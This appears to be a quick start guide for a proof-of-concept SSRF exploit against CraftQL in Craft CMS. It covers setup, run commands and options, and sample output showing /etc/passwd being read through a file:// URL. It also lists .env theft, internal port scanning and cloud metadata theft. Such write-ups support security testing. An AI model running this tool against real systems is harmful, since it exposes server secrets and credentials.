# ğŸš€ Quick Start Guide

Get started with the CraftQL SSRF vulnerability POC in 5 minutes.

---

## ğŸ“‹ Prerequisites

Before running the POC, ensure you have:

- âœ… **Python 3.6+** or **Bash 4+**
- âœ… **Target System**: Craft CMS 3.x with CraftQL <= 1.3.7 installed
- âœ… **GraphQL Token**: Valid CraftQL authentication token
- âœ… **Authorization**: Explicit permission to test the target system

---

## âš¡ Quick Start (Python)

### Step 1: Install Dependencies

```bash
pip install requests
```

### Step 2: Configure

Edit `poc/ssrf_poc.py` and update the configuration:

```python
DEFAULT_CONFIG = {
    'target': 'http://YOUR-TARGET:8888/index.php?p=api',
    'token': 'YOUR-GRAPHQL-TOKEN',
    'project_path': '/path/to/craft/cms',
    'timeout': 60
}
```

### Step 3: Run POC

```bash
cd poc
python3 ssrf_poc.py
```

### Step 4: View Results

The POC will:
1. âœ… Check if the target is vulnerable
2. âœ… Read `/etc/passwd` file
3. âœ… Read `.env` configuration
4. âœ… Scan internal ports
5. âœ… Test cloud metadata theft

---

## âš¡ Quick Start (Bash)

### Step 1: Make Script Executable

```bash
chmod +x poc/ssrf_poc.sh
```

### Step 2: Configure

Edit `poc/ssrf_poc.sh` and update:

```bash
API_URL="http://YOUR-TARGET:8888/index.php?p=api"
TOKEN="YOUR-GRAPHQL-TOKEN"
PROJECT_PATH="/path/to/craft/cms"
```

### Step 3: Run POC

```bash
cd poc
bash ssrf_poc.sh
```

---

## ğŸ¯ Command Line Options (Python)

### Basic Usage

```bash
# Run with default configuration
python3 ssrf_poc.py

# Specify target and token
python3 ssrf_poc.py \
  --target http://target.com/api \
  --token YOUR_TOKEN

# Check vulnerability only (don't exploit)
python3 ssrf_poc.py --check-only

# Custom timeout
python3 ssrf_poc.py --timeout 120
```

### All Options

| Option | Description | Default |
|--------|-------------|---------|
| `--target` | GraphQL API endpoint | Configured in script |
| `--token` | GraphQL authentication token | Configured in script |
| `--project-path` | Path to Craft CMS project | Configured in script |
| `--timeout` | Request timeout (seconds) | 60 |
| `--check-only` | Only check, don't exploit | False |

### Examples

```bash
# Test specific target
python3 ssrf_poc.py \
  --target https://example.com/api \
  --token abc123xyz \
  --project-path /var/www/html

# Quick vulnerability check
python3 ssrf_poc.py --check-only

# Extended timeout for slow targets
python3 ssrf_poc.py --timeout 120
```

---

## ğŸ” Understanding the Output

### Successful Exploitation

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   CraftQL SSRF Exploit POC                                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] Checking GraphQL API...
[âœ“] GraphQL API accessible
[âœ“] Mutation 'upsertTestDefault' is exposed

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   Starting SSRF Exploitation                               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[POC #1] Read local file /etc/passwd
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Target: file:///etc/passwd

[âœ“] Triggered: Internal server error
[âœ“] File downloaded: /path/to/temp/assets.tmp

File Content (2981 bytes):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| `API connection failed` | Target unreachable | Check URL and network |
| `Mutation not exposed` | Token lacks permissions | Update token scopes |
| `Vulnerable code not found` | Already patched | Upgrade POC or target |
